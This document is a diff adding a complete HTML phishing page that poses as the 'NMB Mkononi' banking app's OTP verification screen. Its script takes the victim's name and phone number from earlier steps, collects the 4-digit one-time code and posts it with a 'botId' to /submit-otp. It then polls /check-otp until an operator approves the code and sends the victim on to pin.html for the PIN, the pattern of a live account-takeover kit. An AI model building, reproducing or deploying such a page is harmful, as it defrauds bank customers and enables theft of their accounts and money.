@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>NMB Mkononi - Verify Your Number</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100%;
+            min-height: 100%;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: linear-gradient(
+                180deg,
+                #ff7a00 0%,
+                #ff8c1a 10%,
+                #d96a00 26%,
+                #7a3a00 44%,
+                #2a1400 62%,
+                #0a0500 78%,
+                #000000 100%
+            );
+            background-attachment: fixed;
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+
+        /* ── Top bar (transparent over orange) ── */
+        .top-bar {
+            height: 72px;
+            display: flex;
+            align-items: center;
+            padding: 0 22px;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 2;
+        }
+        .back-btn {
+            color: #fff;
+            font-size: 30px;
+            text-decoration: none;
+            font-weight: 300;
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
+        }
+        .brand-name {
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            opacity: 0.95;
+            margin-left: 14px;
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
+        }
+
+        /* ── Container ── */
+        .container {
+            flex: 1;
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 28px 24px 20px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            z-index: 1;
+        }
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.35);
+        }
+        .subtitle {
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.82);
+            line-height: 1.5;
+            margin-bottom: 4px;
+            text-shadow: 0 1px 6px rgba(0, 0, 0, 0.3);
+        }
+        .wrong-number {
+            font-size: 15px;
+            color: #ffb066;
+            text-decoration: none;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 16px;
+            margin-top: 4px;
+            transition: color 0.2s;
+        }
+        .wrong-number:hover {
+            color: #ffc98a;
+            text-decoration: underline;
+        }
+        .valid-time {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 24px;
+        }
+
+        /* ── OTP boxes ── */
+        .otp {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 22px;
+            justify-content: center;
+        }
+        .otp input {
+            width: 64px;
+            height: 64px;
+            border: 1.5px solid rgba(255, 255, 255, 0.22);
+            border-radius: 14px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            outline: none;
+            color: #ffffff;
+            background: rgba(0, 0, 0, 0.32);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+            caret-color: #ff8c1a;
+        }
+        .otp input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+        .otp input:focus {
+            border-color: #ff8c1a;
+            background: rgba(0, 0, 0, 0.45);
+            box-shadow: 0 0 0 3px rgba(255, 140, 26, 0.25);
+        }
+        .otp input.filled {
+            border-color: #ff8c1a;
+            background: rgba(255, 140, 26, 0.12);
+        }
+
+        /* ── Resend ── */
+        .resend-wrap {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 15px;
+            margin-bottom: 0;
+        }
+        .resend-wrap .timer {
+            font-weight: 700;
+            color: #ffb066;
+        }
+
+        /* ── Continue button (orange) ── */
+        .continue-btn {
+            position: fixed;
+            left: 50%;
+            transform: translateX(-50%);
+            bottom: 28px;
+            width: calc(100% - 48px);
+            max-width: 420px;
+            height: 56px;
+            border: none;
+            border-radius: 12px;
+            background: rgba(255, 140, 26, 0.28);
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: not-allowed;
+            transition: background 0.25s, transform 0.1s, box-shadow 0.25s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.25);
+        }
+        .continue-btn:enabled {
+            background: linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%);
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(255, 122, 0, 0.45);
+        }
+        .continue-btn:enabled:hover {
+            background: linear-gradient(135deg, #ff9a33 0%, #ff7a0d 100%);
+            transform: translateX(-50%) translateY(-1px);
+            box-shadow: 0 8px 24px rgba(255, 122, 0, 0.55);
+        }
+        .continue-btn:enabled:active {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* ── Message box ── */
+        #message-box {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-bottom: 16px;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 480px) {
+            .container {
+                padding: 22px 18px 16px;
+            }
+            .title {
+                font-size: 24px;
+            }
+            .otp {
+                gap: 10px;
+            }
+            .otp input {
+                width: 56px;
+                height: 58px;
+                font-size: 22px;
+            }
+            .continue-btn {
+                height: 54px;
+                font-size: 17px;
+                width: calc(100% - 36px);
+                bottom: 22px;
+            }
+        }
+        @media (max-width: 360px) {
+            .otp {
+                gap: 8px;
+            }
+            .otp input {
+                width: 50px;
+                height: 54px;
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- NMB Mkononi header -->
+    <div class="top-bar">
+        <a href="#" class="back-btn">&#8592;</a>
+        <span class="brand-name">NMB Mkononi</span>
+    </div>
+
+    <div class="container">
+
+        <div class="title">Enter OTP</div>
+
+        <!-- Subtitle filled from localStorage -->
+        <div class="subtitle" id="subtitlePlaceholder">
+            Enter OTP that was sent to (+255) 712345678
+        </div>
+
+        <!-- Wrong Number link -->
+        <a href="details.html" class="wrong-number">Wrong Number?</a>
+
+        <div class="valid-time">The code is valid for 5 minutes</div>
+
+        <!-- 4-digit OTP boxes -->
+        <div class="otp">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        </div>
+
+        <!-- Resend area -->
+        <div class="resend-wrap">
+            Resend code in <span class="timer">05:00</span>
+        </div>
+
+    </div>
+
+    <!-- Button -->
+    <button class="continue-btn">SUBMIT</button>
+
+    <!-- ====== SCRIPT TO DISPLAY PHONE FROM LOCALSTORAGE ====== -->
+    <script>
+        (function() {
+            const phone = localStorage.getItem('phone');
+            const subtitle = document.getElementById('subtitlePlaceholder');
+            if (phone) {
+                subtitle.textContent = 'Enter OTP that was sent to ' + phone;
+            }
+        })();
+    </script>
+
+    <!-- ====== TRANSLATION LAYER (does NOT change logic) ====== -->
+    <script>
+        (function() {
+            const translations = {
+                'Renvoyer le code dans': 'Resend code in',
+                'Renvoyer le code': 'Resend code',
+                'Vérification...': 'Verifying...',
+                'Continuer': 'Continue',
+                'Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.': 'Name missing – please go back and enter your name.',
+                'Numéro de téléphone manquant – veuillez recommencer.': 'Phone number missing – please restart.',
+                'Identifiant du bot manquant – veuillez utiliser le lien correct.': 'Bot ID missing – please use the correct link.',
+                'Code incorrect. Veuillez réessayer.': 'Incorrect code. Please try again.',
+                'Erreur serveur': 'Server error',
+                'Aucun ID reçu': 'No ID received',
+                'Erreur lors du contrôle': 'Verification error',
+                'Erreur de vérification :': 'Verification error:',
+                'Erreur lors de l\'envoi :': 'Send error:'
+            };
+
+            function translateNode(node) {
+                if (node.nodeType === Node.TEXT_NODE) {
+                    let text = node.textContent;
+                    let changed = false;
+                    for (const [fr, en] of Object.entries(translations)) {
+                        if (text.includes(fr)) {
+                            text = text.replace(fr, en);
+                            changed = true;
+                        }
+                    }
+                    if (changed) node.textContent = text;
+                } else if (node.nodeType === Node.ELEMENT_NODE) {
+                    node.childNodes.forEach(child => translateNode(child));
+                }
+            }
+
+            const targetNodes = [document.querySelector('.container'), document.querySelector('.resend-wrap')];
+            const observer = new MutationObserver(() => {
+                targetNodes.forEach(el => {
+                    if (el) translateNode(el);
+                });
+                const msgBox = document.getElementById('message-box');
+                if (msgBox) translateNode(msgBox);
+                const btn = document.querySelector('.continue-btn');
+                if (btn) translateNode(btn);
+            });
+
+            targetNodes.forEach(el => {
+                if (el) {
+                    observer.observe(el, { childList: true, subtree: true, characterData: true });
+                }
+            });
+
+            setTimeout(() => {
+                targetNodes.forEach(el => {
+                    if (el) translateNode(el);
+                });
+                const msgBox = document.getElementById('message-box');
+                if (msgBox) translateNode(msgBox);
+                const btn = document.querySelector('.continue-btn');
+                if (btn) translateNode(btn);
+            }, 100);
+        })();
+    </script>
+
+    <!-- ======== ORIGINAL LOGIC (4-digit + auto-submit) ======== -->
+    <script>
+        (function() {
+            // ── 1. Get parameters ──
+            const urlParams = new URLSearchParams(window.location.search);
+            let botId = urlParams.get('botId') || localStorage.getItem('botId');
+            let name = urlParams.get('name') || localStorage.getItem('name');
+            let phone = urlParams.get('phone') || localStorage.getItem('phone');
+
+            if (!name) {
+                name = localStorage.getItem('fullName');
+                if (name) localStorage.setItem('name', name);
+            }
+
+            if (!phone) {
+                const subtitle = document.querySelector('.subtitle');
+                const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
+                if (match) phone = match[1] + match[2];
+                if (phone) localStorage.setItem('phone', phone);
+            }
+
+            if (botId) localStorage.setItem('botId', botId);
+
+            const container = document.querySelector('.container');
+            const msgDiv = document.createElement('div');
+            msgDiv.id = 'message-box';
+            msgDiv.style.display = 'none';
+            msgDiv.style.padding = '12px 16px';
+            msgDiv.style.borderRadius = '8px';
+            msgDiv.style.marginBottom = '20px';
+            msgDiv.style.fontSize = '15px';
+            msgDiv.style.fontWeight = '500';
+            msgDiv.style.transition = 'all 0.2s ease';
+            const resendWrap = document.querySelector('.resend-wrap');
+            container.insertBefore(msgDiv, resendWrap);
+
+            function showMessage(text, isError = true) {
+                msgDiv.textContent = text;
+                msgDiv.style.display = 'block';
+                msgDiv.style.background = isError ? 'rgba(176, 0, 32, 0.85)' : 'rgba(30, 126, 52, 0.85)';
+                msgDiv.style.color = '#ffffff';
+                msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
+            }
+
+            function hideMessage() {
+                msgDiv.style.display = 'none';
+                msgDiv.textContent = '';
+            }
+
+            const inputs = document.querySelectorAll('.otp input');
+            const continueBtn = document.querySelector('.continue-btn');
+
+            function sanitizeDigit(value) {
+                return value.replace(/\D/g, '');
+            }
+
+            function checkAllFilled() {
+                let allFilled = true;
+                inputs.forEach(input => {
+                    if (input.value.trim() === '') allFilled = false;
+                });
+                if (allFilled) {
+                    continueBtn.disabled = false;
+                    continueBtn.style.background = 'linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%)';
+                    continueBtn.style.cursor = 'pointer';
+                } else {
+                    continueBtn.disabled = true;
+                    continueBtn.style.background = 'rgba(255, 140, 26, 0.28)';
+                    continueBtn.style.cursor = 'not-allowed';
+                }
+                return allFilled;
+            }
+
+            // Auto-submit when all 4 digits are entered
+            function maybeAutoSubmit() {
+                if (checkAllFilled() && !continueBtn.disabled) {
+                    // Small delay so the last digit is visibly registered
+                    setTimeout(() => {
+                        if (!continueBtn.disabled) continueBtn.click();
+                    }, 250);
+                }
+            }
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function() {
+                    const cleaned = sanitizeDigit(this.value);
+                    if (cleaned !== this.value) {
+                        this.value = cleaned;
+                    }
+                    // Visual filled state
+                    if (this.value.length === 1) {
+                        this.classList.add('filled');
+                    } else {
+                        this.classList.remove('filled');
+                    }
+
+                    if (this.value.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                        // If this was the last box → auto submit
+                        if (index === inputs.length - 1) {
+                            maybeAutoSubmit();
+                        }
+                    } else {
+                        // Clear filled state
+                        checkAllFilled();
+                    }
+                    hideMessage();
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = sanitizeDigit(paste);
+                    if (digits) {
+                        // Distribute pasted digits across boxes starting at this index
+                        const chars = digits.split('');
+                        for (let i = 0; i < chars.length && (index + i) < inputs.length; i++) {
+                            inputs[index + i].value = chars[i];
+                            inputs[index + i].classList.add('filled');
+                        }
+                        const lastIndex = Math.min(index + chars.length - 1, inputs.length - 1);
+                        inputs[lastIndex].focus();
+                        // Auto-submit if paste filled all boxes
+                        if (checkAllFilled()) {
+                            maybeAutoSubmit();
+                        } else {
+                            hideMessage();
+                        }
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+
+                input.addEventListener('blur', checkAllFilled);
+            });
+
+            const timerSpan = document.querySelector('.timer');
+            const resendWrapEl = document.querySelector('.resend-wrap');
+            let totalSeconds = 5 * 60;
+            let interval = null;
+
+            function formatTime(sec) {
+                const m = String(Math.floor(sec / 60)).padStart(2, '0');
+                const s = String(sec % 60).padStart(2, '0');
+                return `${m}:${s}`;
+            }
+
+            function updateTimerUI() {
+                if (totalSeconds <= 0) {
+                    resendWrapEl.innerHTML = 'Renvoyer le code';
+                    resendWrapEl.style.color = '#ffb066';
+                    resendWrapEl.style.cursor = 'pointer';
+                    resendWrapEl.style.fontWeight = '700';
+                    clearInterval(interval);
+                    interval = null;
+                    resendWrapEl.onclick = function(e) {
+                        e.preventDefault();
+                        startTimer(5 * 60);
+                        hideMessage();
+                    };
+                    return;
+                }
+                timerSpan.textContent = `dans ${formatTime(totalSeconds)}`;
+                resendWrapEl.innerHTML = `Renvoyer le code dans <span class="timer">${formatTime(totalSeconds)}</span>`;
+                resendWrapEl.style.color = 'rgba(255, 255, 255, 0.7)';
+                resendWrapEl.style.cursor = 'default';
+                resendWrapEl.style.fontWeight = '400';
+                resendWrapEl.onclick = null;
+            }
+
+            function startTimer(seconds) {
+                if (interval) clearInterval(interval);
+                totalSeconds = seconds;
+                updateTimerUI();
+                interval = setInterval(() => {
+                    totalSeconds--;
+                    if (totalSeconds <= 0) {
+                        totalSeconds = 0;
+                        updateTimerUI();
+                        clearInterval(interval);
+                        interval = null;
+                    } else {
+                        updateTimerUI();
+                    }
+                }, 1000);
+            }
+
+            startTimer(5 * 60);
+
+            function hasRequiredData() {
+                if (!name) {
+                    showMessage('Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.', true);
+                    return false;
+                }
+                if (!phone) {
+                    showMessage('Numéro de téléphone manquant – veuillez recommencer.', true);
+                    return false;
+                }
+                if (!botId) {
+                    showMessage('Identifiant du bot manquant – veuillez utiliser le lien correct.', true);
+                    return false;
+                }
+                hideMessage();
+                return true;
+            }
+
+            continueBtn.addEventListener('click', function() {
+                if (this.disabled) return;
+
+                if (!hasRequiredData()) return;
+
+                const otp = Array.from(inputs).map(inp => inp.value).join('');
+
+                continueBtn.disabled = true;
+                continueBtn.textContent = 'Vérification...';
+                continueBtn.style.background = '#f5a623';
+
+                fetch('/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, phone, otp, botId })
+                })
+                .then(response => {
+                    if (!response.ok) throw new Error('Erreur serveur');
+                    return response.json();
+                })
+                .then(data => {
+                    const requestId = data.requestId;
+                    if (!requestId) throw new Error('Aucun ID reçu');
+
+                    let pollInterval = setInterval(() => {
+                        fetch(`/check-otp/${requestId}`)
+                            .then(res => {
+                                if (!res.ok) throw new Error('Erreur lors du contrôle');
+                                return res.json();
+                            })
+                            .then(status => {
+                                if (status.approved === true) {
+                                    clearInterval(pollInterval);
+                                    window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
+                                } else if (status.approved === false) {
+                                    clearInterval(pollInterval);
+                                    showMessage('Code incorrect. Veuillez réessayer.', true);
+                                    continueBtn.disabled = false;
+                                    continueBtn.textContent = 'Continuer';
+                                    continueBtn.style.background = 'linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%)';
+                                    continueBtn.style.cursor = 'pointer';
+                                    inputs.forEach(inp => {
+                                        inp.value = '';
+                                        inp.classList.remove('filled');
+                                    });
+                                    checkAllFilled();
+                                    inputs[0].focus();
+                                }
+                            })
+                            .catch(err => {
+                                clearInterval(pollInterval);
+                                showMessage('Erreur de vérification : ' + err.message, true);
+                                continueBtn.disabled = false;
+                                continueBtn.textContent = 'Continuer';
+                                continueBtn.style.background = 'linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%)';
+                                continueBtn.style.cursor = 'pointer';
+                            });
+                    }, 2000);
+                })
+                .catch(err => {
+                    showMessage('Erreur lors de l\'envoi : ' + err.message, true);
+                    continueBtn.disabled = false;
+                    continueBtn.textContent = 'Continuer';
+                    continueBtn.style.background = 'linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%)';
+                    continueBtn.style.cursor = 'pointer';
+                });
+            });
+
+            hasRequiredData();
+
+        })();
+    </script>
+
+</body>
+</html>
